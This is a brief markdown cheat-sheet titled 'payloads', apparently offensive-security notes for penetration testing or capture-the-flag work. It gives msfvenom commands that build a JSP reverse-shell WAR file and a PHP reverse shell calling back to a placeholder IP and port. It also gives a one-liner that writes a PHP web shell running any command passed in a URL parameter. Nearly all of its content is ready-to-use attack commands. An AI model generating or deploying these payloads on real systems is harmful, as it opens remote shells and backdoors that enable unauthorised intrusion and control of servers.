---
title: payloads
---

# payloads

- msfvenom
    - war `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`
    - php `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php`
- php
    - `echo '<?php system($_GET["cmd"]); ?>' > webshell.php`